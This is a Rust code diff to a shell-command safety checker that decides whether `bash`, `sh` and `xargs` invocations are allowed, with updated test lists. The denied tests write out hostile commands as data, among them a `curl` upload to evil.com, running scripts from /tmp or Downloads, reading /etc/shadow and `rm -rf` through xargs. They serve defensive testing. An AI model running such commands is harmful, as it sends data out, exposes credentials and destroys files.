@@ -14,13 +14,27 @@ pub fn is_safe_shell(tokens: &[Token]) -> Verdict {
     if tokens.len() == 3 && tokens[1].as_str() == "-n" {
         return Verdict::Allowed(SafetyLevel::Inert);
     }
-    let Some(idx) = tokens.iter().position(|t| *t == "-c") else {
-        return Verdict::Denied;
-    };
-    let Some(script) = tokens.get(idx + 1) else {
-        return Verdict::Denied;
-    };
-    crate::command_verdict(script.as_str())
+    if let Some(idx) = tokens.iter().position(|t| *t == "-c") {
+        let Some(script) = tokens.get(idx + 1) else {
+            return Verdict::Denied;
+        };
+        return crate::command_verdict(script.as_str());
+    }
+    // No `-c`: `bash [--] SCRIPT [args]` runs a script FILE. The execution-origin gate
+    // (docs/design/behavioral-taxonomy-execution-origin.md) allows a WORKTREE-local script
+    // (the dev loop) and denies a foreign one (`/tmp/x.sh`, `~/x.sh`). Only a bare script
+    // operand is modeled: any option (`-i`, `-s`, `-o pipefail`) fails closed, since a
+    // value-flag could hide the real executor behind what looks like a worktree path.
+    let mut i = 1;
+    if tokens.get(i).map(Token::as_str) == Some("--") {
+        i += 1;
+    }
+    match tokens.get(i) {
+        Some(script) if !script.as_str().starts_with('-') => {
+            crate::engine::resolve::execute_file_verdict(script.as_str())
+        }
+        _ => Verdict::Denied,
+    }
 }
 
 pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
@@ -58,12 +72,22 @@ pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
         if s.starts_with("-") {
             return Verdict::Denied;
         }
-        let inner = shell_words::join(
-            tokens[i..]
-                .iter()
-                .map(Token::as_str)
-                .filter(|t| replstr.as_deref() != Some(*t)),
-        );
+        // The stdin items xargs injects are operands of the inner command. Their locus is the
+        // pipe source's output-path locus (bound by the pipeline walker); with no known source it
+        // worst-cases to an unpinnable sentinel. So `find / | xargs cat` → `cat /sc_item` (deny),
+        // `find ./src | xargs cat` → `cat ./src/sc_item` (allow), bare `xargs cat` → `cat <?>`
+        // (deny). This is the same operand-binding `find -exec` gives `{}`, sourced from the pipe.
+        let repr = crate::pathctx::stdin_item_repr().unwrap_or_else(|| "/__SAFE_CHAINS_CMDSUB__".to_string());
+        let inner = if let Some(r) = &replstr {
+            // `-I R`: substitute each occurrence of R with the item representative
+            // (`xargs -I{} rm -rf {}/sub` → `rm -rf <repr>/sub`).
+            shell_words::join(tokens[i..].iter().map(|t| t.as_str().replace(r.as_str(), &repr)))
+        } else {
+            // Appended form: items follow the given operands (`xargs cat` → `cat <repr>`).
+            let mut words: Vec<String> = tokens[i..].iter().map(|t| t.as_str().to_string()).collect();
+            words.push(repr);
+            shell_words::join(&words)
+        };
         return crate::command_verdict(&inner);
     }
     Verdict::Allowed(SafetyLevel::Inert)
@@ -128,17 +152,22 @@ mod tests {
         sh_version: "sh --version",
         bash_help: "bash --help",
         sh_help: "sh --help",
-        xargs_grep: "xargs grep pattern",
-        xargs_cat: "xargs cat",
-        xargs_with_flags: "xargs -I {} cat {}",
+        // inner commands that do NOT read the injected operand as a path stay allowed:
         xargs_with_joined_flag: "xargs -I{} basename {}",
-        xargs_zero_flag: "xargs -0 grep foo",
         xargs_npx_safe: "xargs npx eslint src/",
         xargs_find_safe: "xargs find . -name '*.py'",
-        xargs_sed_safe: "xargs sed 's/foo/bar/'",
         xargs_nested_bash_safe: "xargs bash -c 'git status'",
+        // flow-aware: a WORKSPACE-bounded pipe source keeps a file-reading inner allowed
+        xargs_piped_find_workspace: "find . -name '*.log' | xargs cat",
+        xargs_piped_ls: "ls | xargs wc -l",
         // engine-authoritative: `bash -c "rm file"` deletes a WORKTREE file → developer.
         bash_c_worktree_rm: "bash -c \"rm file\"",
+        // execution-origin: running the workspace's OWN script is the dev loop.
+        bash_worktree_script: "bash script.sh",
+        bash_worktree_script_subdir: "bash scripts/deploy.sh",
+        bash_worktree_script_dotslash: "bash ./run.sh",
+        bash_worktree_script_dashdash: "bash -- ./run.sh",
+        sh_worktree_script: "sh setup.sh",
         break_bare: "break",
         break_numeric: "break 2",
         continue_bare: "continue",
@@ -147,12 +176,32 @@ mod tests {
 
     denied! {
         sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
-        bash_script_denied: "bash script.sh",
+        // execution-origin: a FOREIGN executor (staged, downloaded, home, system) denies.
+        bash_tmp_script_denied: "bash /tmp/evil.sh",
+        bash_home_script_denied: "bash ~/Downloads/x.sh",
+        bash_abs_script_denied: "bash /usr/local/bin/x",
+        bash_parent_escape_denied: "bash ../x.sh",
+        // an option we don't model fails closed rather than guess the real executor.
+        bash_option_script_denied: "bash -o pipefail run.sh",
+        bash_interactive_denied: "bash -i",
+        bash_bare_denied: "bash",
+        sh_stdin_denied: "sh -s",
         xargs_rm_denied: "xargs rm",
         xargs_replace_rm_denied: "xargs -I X rm X",
         xargs_replace_braces_rm_denied: "xargs -I {} rm {}",
         xargs_replace_joined_rm_denied: "xargs -I{} rm {}",
+        // the replstr EMBEDDED in a larger token is still item-derived → must deny.
+        xargs_replace_embedded_rm_denied: "xargs -I{} rm -rf {}/sub",
+        xargs_replace_embedded_suffix_denied: "xargs -I{} rm -rf {}.bak",
+        // a file-reading inner with NO known pipe source → the injected operand is unpinnable → deny
+        xargs_cat_no_source: "xargs cat",
+        xargs_grep_no_source: "xargs grep pattern",
+        xargs_replace_cat_no_source: "xargs -I {} cat {}",
+        xargs_zero_grep_no_source: "xargs -0 grep foo",
+        xargs_sed_read_no_source: "xargs sed 's/foo/bar/'",
         xargs_curl_denied: "xargs curl",
+        // flow-aware: a HOT pipe source makes the injected operand deny
+        xargs_piped_secret_cat: "echo /etc/shadow | xargs cat",
         xargs_npx_unsafe: "xargs npx cowsay",
         xargs_sed_inplace_denied: "xargs sed -i 's/foo/bar/'",
         xargs_find_delete_denied: "xargs find . -delete",
